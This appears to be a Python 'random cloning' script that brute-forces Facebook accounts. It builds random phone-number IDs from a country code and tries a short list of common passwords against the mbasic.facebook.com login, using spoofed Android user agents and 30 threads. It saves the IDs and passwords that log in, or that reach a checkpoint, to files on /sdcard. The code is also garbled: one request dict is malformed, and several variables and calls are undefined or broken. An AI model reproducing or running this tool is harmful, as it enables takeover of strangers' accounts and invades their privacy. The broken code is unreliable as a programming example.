import os
import sys
import time
import requests
import uuid
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install bs4')
class jalan:
	
    def __init__(self, z):
        pass
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0)
           
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
ugen2=[]
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
asu = random.choice(my_color)
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'


logo =                      ("""
       d8888        d8888 88888888888      
      d88888       d88888     888          
     d88P888      d88P888     888          
    d88P 888     d88P 888     888          
   d88P  888    d88P  888     888          
  d88P   888   d88P   888     888          
 d8888888888  d8888888888     888          
d88P     888 d88P     888     888
\033[1;97m---------------------------------------------
\033[1;97m[-] 𝐀𝐔𝐓𝐇𝐎𝐑    :\033[1;32m𝐀𝐃𝐈𝐋 𝐓𝐎𝐎𝐑
\033[1;97m[-] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  :𝐓𝐄𝐀𝐌-𝐀𝐀𝐓
\033[1;97m[-] 𝐒𝐀𝐓𝐔𝐓𝐒    :\033[1;31m𝐅𝐑𝐄𝐄
\033[1;97m[-] 𝐕𝐄𝐑𝐒𝐎𝐍    :V.1.0
\033[1;97m---------------------------------------------
            \033[1;31m𝐏𝐑𝐎𝐔𝐃 𝐓𝐎 𝐁𝐄 𝐌𝐔𝐒𝐋𝐈𝐌
            \33[1;32m𝐓𝐄𝐀𝐌-𝐀𝐀𝐓 𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄
\033[1;97m---------------------------------------------""")
loop = 0
oks = []
cps = []


def s():
    os.system('clear')
    print(logo)
    print('\033[1;97m [1] 𝐒𝐓𝐀𝐑𝐓 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 ')
    print('\033[1;97m [0] \x1b[1;31m𝐄𝐗𝐈𝐓')
    print('\033[1;97m================================================')
    opt = input('\033[1;97m [•] 𝐒𝐄𝐋𝐄𝐂𝐓: ')
    if opt == '1':
        AAT()
 
    if opt == '0':
        os.system('exit')
        return None
    print('\x1b[1;31m SELECT CORRECTLY\x1b[0;97m')
 

            
def AAT():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)  
    
    code = input(' 𝐏𝐔𝐓 𝐘𝐎𝐔𝐑 𝐂𝐎𝐔𝐍𝐓𝐑𝐘 𝐂𝐎𝐃𝐄: ')
    print('\033[1;97m================================================')
    limit = int(input(' 𝐄𝐍𝐓𝐄𝐑 𝐍𝐔𝐌𝐁𝐄𝐑 𝐎𝐅 𝐈𝐃𝐙: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print('\033[1;97m [•]  𝐓𝐎𝐓𝐄𝐋 𝐈𝐃𝐒:'+tl)
        print('\033[1;97m [•]  𝐓𝐇𝐄 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃')
        print(' [•]  \33[0;41m𝐏𝐑𝐎𝐔𝐃 𝐓𝐎 𝐁𝐄 𝐌𝐔𝐒𝐋𝐈𝐌\33[0m')
        print('\033[1;97m================================================')
        for love in user:
            pwx = [love,'khankhan','khan12345','malik786','ali123','nawabzada']
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;97m===================================================')
    print('𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐂𝐎𝐌𝐏𝐄𝐋𝐄𝐓')
    print('𝐀𝐋𝐋𝐀𝐇 𝐇𝐀𝐅𝐈𝐙')

  
 
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            nip= random.choice()
            session = requests.Session()
            free_fb = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": ua}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m [𝐀𝐀𝐓-𝐎𝐊]  ' +cid+ ' | ' +ps+  ' \33[0;97m')
                open('/sdcard/𝐀𝐀𝐓-𝐎𝐊.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;91m [𝐀𝐀𝐓-𝐂𝐏]  ' +cid+ ' | ' +ps+   ' \33[0;97m')
                open('/sdcard/𝐀𝐀𝐓-𝐂𝐏.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[𝐎𝐊:%s] [𝐎𝐊:%s]'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
s() 
